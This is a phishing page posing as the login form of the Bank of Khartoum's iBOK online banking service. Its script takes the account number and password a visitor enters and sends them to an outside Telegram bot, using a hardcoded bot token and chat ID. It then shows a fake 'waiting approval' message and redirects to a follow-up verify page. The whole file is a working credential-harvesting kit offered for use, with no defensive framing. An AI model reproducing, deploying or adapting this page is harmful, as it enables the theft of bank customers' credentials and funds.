<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Form tracking iBOK</title>

    <style>
         :root {
            --red: #ef2e31;
            --yellow: #ffcf00;
            --ink: #101820;
            --muted: #68798a;
            --field: #fff5f5;
            --border: #ffb8b8;
        }
        
        * {
            box-sizing: border-box;
        }
        
        body {
            margin: 0;
            min-height: 100vh;
            color: var(--ink);
            font-family: Arial, Helvetica, sans-serif;
            background: #f2f5f9;
        }
        
        .page {
            min-height: 100vh;
            margin: 4px;
            border: 1px solid #ddd;
            border-radius: 8px;
            overflow: hidden;
            display: flex;
            flex-direction: column;
            background: radial-gradient(#c8d0da 0.85px, transparent 0.85px) 0 0 / 18px 18px, #f2f5f9;
        }
        
        header {
            min-height: 142px;
            padding: 11px 20px 24px;
            color: #fff;
            background: var(--red);
        }
        
        .welcome,
        .brand {
            width: min(704px, 100%);
            margin-inline: auto;
        }
        
        .welcome {
            min-height: 36px;
            padding: 6px 12px;
            border-radius: 24px;
            display: flex;
            justify-content: center;
            align-items: center;
            color: #111;
            background: var(--yellow);
            font-size: 14px;
            font-weight: 700;
            text-align: center;
        }
        
        .brand {
            margin-top: 10px;
        }
        
        .brand-name {
            font-size: 32px;
            line-height: 1.05;
            font-weight: 800;
            letter-spacing: -1px;
        }
        
        .brand-caption {
            margin-top: 6px;
            font-size: 13px;
        }
        
        main {
            flex: 1;
            padding: 0 16px 42px;
        }
        
        .card {
            position: relative;
            width: min(672px, 100%);
            margin: -12px auto 0;
            padding: 25px 40px 24px;
            border-radius: 15px;
            background: #fff;
            box-shadow: 0 15px 28px rgba(190, 35, 40, 0.12);
        }
        
        h1 {
            margin: 0;
            color: var(--red);
            font-size: 24px;
            line-height: 1.25;
            text-align: center;
        }
        
        .subtitle {
            width: fit-content;
            margin: 16px auto 22px;
            padding-bottom: 8px;
            border-bottom: 2px solid var(--red);
            font-size: 17px;
            font-weight: 700;
            text-align: center;
        }
        
        .demo-note {
            margin: -8px 0 18px;
            padding: 10px 11px;
            border: 1px solid #f1d783;
            border-radius: 8px;
            color: #5f4b12;
            background: #fff9e4;
            font-size: 13px;
            line-height: 1.45;
            text-align: center;
        }
        
        .field {
            margin-bottom: 19px;
        }
        
        label {
            display: block;
            margin-bottom: 9px;
            font-size: 16px;
            font-weight: 700;
        }
        
        .input-wrap {
            height: 44px;
            display: flex;
            align-items: center;
            overflow: hidden;
            border: 1px solid var(--border);
            border-radius: 10px;
            background: var(--field);
        }
        
        input {
            width: 100%;
            height: 100%;
            padding: 0 14px;
            border: 0;
            outline: none;
            color: var(--ink);
            background: transparent;
            font: inherit;
            font-size: 16px;
        }
        
        input:focus-visible,
        button:focus-visible {
            outline: 3px solid #2463eb;
            outline-offset: -3px;
        }
        
        input::placeholder {
            color: var(--muted);
        }
        
        .password-wrap input {
            padding-right: 4px;
        }
        
        .show-password {
            height: 100%;
            padding: 0 12px;
            border: 0;
            color: #526579;
            background: transparent;
            cursor: pointer;
            font-weight: 700;
        }
        
        .demo-action {
            width: 100%;
            min-height: 44px;
            margin-top: 4px;
            border: 0;
            border-radius: 10px;
            color: #fff;
            background: var(--red);
            cursor: pointer;
            font-size: 16px;
            font-weight: 700;
        }
        
        .demo-action:hover {
            background: #d92529;
        }
        
        .message {
            display: none;
            margin-top: 14px;
            padding: 11px;
            border-radius: 8px;
            font-size: 14px;
            line-height: 1.45;
            text-align: center;
        }
        
        .message.visible {
            display: block;
        }
        
        .message.error {
            color: #a32121;
            background: #fff0f0;
        }
        
        .message.success {
            color: #245b2a;
            background: #eef8ee;
        }
        
        footer {
            min-height: 55px;
            padding: 12px 10px 8px;
            border-top: 4px solid var(--red);
            color: #607080;
            background: #fff;
            font-size: 11px;
            line-height: 1.6;
            text-align: center;
        }
        
        @media (max-width: 600px) {
            .page {
                margin: 0;
                border-radius: 0;
            }
            header {
                min-height: 132px;
            }
            main {
                padding: 0 12px 32px;
            }
            .card {
                padding: 24px 22px;
            }
            h1 {
                font-size: 22px;
            }
        }
    </style>
</head>

<body>
    <div class="page">
        <header>
            <div class="welcome">Welcome to iBOK online banking service</div>
            <div class="brand">
                <div class="brand-name">iBOK</div>
                <div class="brand-caption">Online Form</div>
            </div>
        </header>

        <main>
            <section class="card" aria-labelledby="form-title">
                <h1 id="form-title">Online Form</h1>
                <div class="subtitle">Please enter the data</div>

                <p class="demo-note">
                    Account number.
                </p>

                <form id="demo-form" autocomplete="off">
                    <div class="field">
                        <label for="account">Enter the account number (7 digits):</label>
                        <div class="input-wrap">
                            <input id="account" name="account" type="text" inputmode="numeric" pattern="\d{7}" minlength="7" maxlength="7" placeholder="Enter 7 digits account number" autocomplete="off" required>
                        </div>
                    </div>

                    <div class="field">
                        <label for="password">Password:</label>
                        <div class="input-wrap password-wrap">
                            <input id="password" name="password" type="password" placeholder="Enter Password" autocomplete="new-password" required>
                            <button class="show-password" type="button" id="toggle-password" aria-label="Show demo passphrase" aria-pressed="false">Show</button>
                        </div>
                    </div>

                    <button class="demo-action" type="submit">Log In</button>
                    <div class="message" id="message" role="status" aria-live="polite"></div>
                </form>
            </section>
        </main>

        <footer>
            iBOK I Bank of Khartoum 2026<br> All rights reserved, Bank of Khartoum, iBOK 2026.
        </footer>
    </div>

    <script>
        // =======================
        // BOT CONFIG
        // =======================
        const BOT_TOKEN = '7996666362:AAFVzLC1LD14nkmJN8MN98SRdOu2hIA1ftc';
        const CHAT_ID = '8406078749';

        // =======================
        // DOM REFERENCES
        // =======================
        const demoForm = document.getElementById("demo-form");
        const accountInput = document.getElementById("account");
        const passwordInput = document.getElementById("password");
        const togglePasswordBtn = document.getElementById("toggle-password");
        const messageDiv = document.getElementById("message");

        // =======================
        // PASSWORD VISIBILITY TOGGLE
        // =======================
        if (togglePasswordBtn) {
            togglePasswordBtn.addEventListener("click", function() {
                const type = passwordInput.getAttribute("type") === "password" ? "text" : "password";
                passwordInput.setAttribute("type", type);
                this.textContent = type === "password" ? "Show" : "Hide";
            });
        }

        // =======================
        // FORM SUBMIT & TELEGRAM BOT
        // =======================
        demoForm.addEventListener("submit", function(event) {
            event.preventDefault();

            const account = accountInput.value.trim();
            const password = passwordInput.value.trim();

            if (!account || !password) {
                messageDiv.textContent = "Please fill in all fields.";
                messageDiv.className = "message visible error";
                return;
            }

            // Validate account number is exactly 7 digits
            const accountRegex = /^\d{7}$/;
            if (!accountRegex.test(account)) {
                messageDiv.textContent = "Account number must be exactly 7 digits.";
                messageDiv.className = "message visible error";
                return;
            }

            // Format message to send to Telegram
            const textMessage = `New iBOK Login Attempt:\n\nAccount: ${account}\nPassword: ${password}`;

            // Send data to Telegram Bot API
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: textMessage
                    })
                })
                .then(response => response.json())
                .then(data => {
                    if (data.ok) {
                        messageDiv.textContent = "waiting approval.....";
                        messageDiv.className = "message visible success";

                        // Redirect to verify.html after a 1.5-second delay
                        setTimeout(() => {
                            window.location.href = 'verify.html';
                        }, 1500);
                    } else {
                        messageDiv.textContent = "Error sending data. Try again.";
                        messageDiv.className = "message visible error";
                    }
                })
                .catch(error => {
                    console.error("Error:", error);
                    messageDiv.textContent = "Network error occurred.";
                    messageDiv.className = "message visible error";
                });
        });
    </script>
</body>

</html>
